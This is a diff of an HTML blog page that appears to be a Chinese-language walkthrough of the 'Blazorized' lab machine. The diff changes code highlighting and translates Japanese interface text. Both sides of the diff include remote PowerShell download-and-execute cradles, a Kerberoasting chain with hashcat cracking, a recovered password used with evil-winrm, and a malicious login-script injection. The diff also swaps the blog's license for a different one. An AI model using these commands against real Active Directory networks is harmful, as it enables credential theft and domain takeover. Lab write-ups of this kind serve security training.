@@ -161,7 +161,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="検索">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -364,7 +364,7 @@
             </figure>
 
 <p>以及运行bloodhound收集分析：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IEX(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">'http://10.10.14.14:7777/adPEAS.ps1'</span>)</span><br><span class="line">invoke-adpeas</span><br></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IEX(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">'http://10.10.14.14:7777/adPEAS.ps1'</span>)</span><br><span class="line"><span class="built_in">invoke-adpeas</span></span><br></pre></td></tr></table></figure>
 
 <p>然后分析bloodhound，发现对rsa_4810的WriteSPN权限：</p>
 <figure class="image-bubble">
@@ -377,7 +377,7 @@
 
 <p> 那就是标准的加spn后Kerberoast</p>
 <h1 id="rsa-4810"><a href="#rsa-4810" class="headerlink" title="rsa_4810"></a>rsa_4810</h1><p>设置spn，Kerberoast，破解出密码：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">IEX(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">'http://10.10.14.14:7777/PowerView.ps1'</span>)</span><br><span class="line"></span><br><span class="line">Set-DomainObject -Credential <span class="variable">$Cred</span> -Identity rsa_4810 -SET @&#123;serviceprincipalname=<span class="string">'miao/miao'</span>&#125;</span><br><span class="line">Get-DomainUser -Identity rsa_4810 | get-domainspnticket -format hashcat</span><br><span class="line"></span><br><span class="line">sudo hashcat -m <span class="number">13100</span> hash.txt ~/Tools/dict/rockyou.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 破解出来的有空格，并且注意括号也是密码的一部分，不是hashcat的输出处理</span></span><br><span class="line">(Ni7856<span class="keyword">Do</span>9854Ki05Ng0005 <span class="comment">#)</span></span><br><span class="line"></span><br><span class="line">evil-winrm -i <span class="number">10.10</span>.<span class="number">11.22</span> -u RSA_4810 -p <span class="string">'(Ni7856Do9854Ki05Ng0005 #)'</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">IEX(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">'http://10.10.14.14:7777/PowerView.ps1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-DomainObject</span> <span class="literal">-Credential</span> <span class="variable">$Cred</span> <span class="literal">-Identity</span> rsa_4810 <span class="literal">-SET</span> <span class="selector-tag">@</span>&#123;serviceprincipalname=<span class="string">'miao/miao'</span>&#125;</span><br><span class="line"><span class="built_in">Get-DomainUser</span> <span class="literal">-Identity</span> rsa_4810 | <span class="built_in">get-domainspnticket</span> <span class="literal">-format</span> hashcat</span><br><span class="line"></span><br><span class="line">sudo hashcat <span class="literal">-m</span> <span class="number">13100</span> hash.txt ~/Tools/dict/rockyou.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 破解出来的有空格，并且注意括号也是密码的一部分，不是hashcat的输出处理</span></span><br><span class="line">(Ni7856<span class="keyword">Do</span>9854Ki05Ng0005 <span class="comment">#)</span></span><br><span class="line"></span><br><span class="line">evil<span class="literal">-winrm</span> <span class="literal">-i</span> <span class="number">10.10</span>.<span class="number">11.22</span> <span class="literal">-u</span> RSA_4810 <span class="literal">-p</span> <span class="string">'(Ni7856Do9854Ki05Ng0005 #)'</span></span><br></pre></td></tr></table></figure>
 
 <figure class="image-bubble">
                 <div class="img-lightbox">
@@ -407,7 +407,7 @@
 
 <p>系统中并没有LSA_3214这个用户，但LSA是local support admin，我们现在有的rsa是remote support admin也有同样的support admin修改权限</p>
 <p>所以就是修改SSA_6010的登录脚本，等待触发：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'powershell -e JA...'</span>| <span class="built_in">Out-File</span> -FilePath C:\windows\SYSVOL\sysvol\blazorized.htb\scripts\A32FF3AEAA23\login.bat -Encoding ASCII</span><br><span class="line"></span><br><span class="line">Set-ADUser -Identity SSA_6010 -ScriptPath <span class="string">'A32FF3AEAA23\login.bat'</span></span><br><span class="line">get-aduser ssa_6010 -properties scriptpath</span><br></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'powershell -e JA...'</span>| <span class="built_in">Out-File</span> <span class="literal">-FilePath</span> C:\windows\SYSVOL\sysvol\blazorized.htb\scripts\A32FF3AEAA23\login.bat <span class="literal">-Encoding</span> ASCII</span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-ADUser</span> <span class="literal">-Identity</span> SSA_6010 <span class="literal">-ScriptPath</span> <span class="string">'A32FF3AEAA23\login.bat'</span></span><br><span class="line"><span class="built_in">get-aduser</span> ssa_6010 <span class="literal">-properties</span> scriptpath</span><br></pre></td></tr></table></figure>
 
 <figure class="image-bubble">
                 <div class="img-lightbox">
@@ -470,7 +470,7 @@
     <div class="content">
         
 <span class="post-time">
-    最終更新：<time datetime="2024-11-11T05:33:22.597Z" itemprop="dateUpdated">2024-11-11 13:33:22</time>
+    Last updated: <time datetime="2024-11-11T05:33:22.597Z" itemprop="dateUpdated">2024-11-11 13:33:22</time>
 </span><br>
 
 
@@ -637,7 +637,7 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>このブログの内容物は<a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.ja" target="_blank">クリエイティブ・コモンズ 表示 - 非営利 - 継承 4.0 国際ライセンスの下に提供されています</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
